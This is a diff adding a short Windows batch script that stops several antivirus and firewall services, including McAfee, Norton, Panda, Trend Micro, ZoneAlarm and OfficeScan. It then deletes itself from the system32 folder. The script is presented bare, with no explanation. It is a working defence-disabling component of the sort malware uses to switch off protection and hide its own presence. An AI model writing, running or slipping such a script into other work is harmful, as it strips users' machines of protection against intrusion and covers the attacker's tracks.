@@ -1,0 +1,9 @@
+net stop Mcshield
+net stop "Norton Antivirus Service"
+net stop "Panda Antivirus"
+net stop "TrendMicro Infrastructure"
+net stop "ZoneAlarm"
+set fuckms="McAfee Framework Service"
+net stop "Detector de OfficeScanNT"
+net stop %fuckms%
+del %windir%\system32\stop.bat /q
